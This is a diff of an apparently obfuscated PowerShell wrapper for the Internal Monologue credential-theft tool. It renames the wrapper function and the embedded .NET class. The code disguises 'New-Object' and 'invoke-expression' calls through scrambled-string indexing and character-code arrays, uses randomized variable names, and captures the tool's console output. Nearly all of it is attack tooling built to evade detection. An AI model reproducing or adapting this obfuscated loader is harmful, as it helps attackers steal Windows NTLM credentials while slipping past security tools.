@@ -1,4 +1,4 @@
-function Invoke-IM
+function Invoke-Internalmonologue
 {
 
     [CmdletBinding()]
@@ -19,7 +19,7 @@ function Invoke-IM
     $ZUNrmDBV2UIvygzy9WJVe = & (("05DvC9EBGqTN2IygxWPZmSnawL814uRiV6jsfdhzro7KA-OtpJXMkbFHUYe3Qlc")[11,58,24,45,46,53,34,58,62,47] -join '') IO.StringWriter
     [Console]::SetOut($ZUNrmDBV2UIvygzy9WJVe)
 
-    [IM.Program]::Main($mNpKfmtoB83SGUH.Split(([string]::join('', ( (32) |%{$_}|%{ ( [char][int] $($_))})) |%{$($_)}| % {$($_)})))
+    [Internalmonologue.Program]::Main($mNpKfmtoB83SGUH.Split(([string]::join('', ( (32) |%{$_}|%{ ( [char][int] $($_))})) |%{$($_)}| % {$($_)})))
 
     [Console]::SetOut($OldConsoleOut)
     $yR7Pb39oFmQVDdfXjr = $(& ([string]::join('', ( (105,110,118,111,107,101,45,101,120,112,114,101,115,115,105,111,110) |%{ ( [char][int] $_)})) | % {$_})([string]::join('', ( (36,90,85,78,114,109,68,66,86,50,85,73,118,121,103,122,121,57,87,74,86,101,46,84,111,83,116,114,105,110,103,40,41) |%{ ( [char][int] $_)})) | % {$_}))
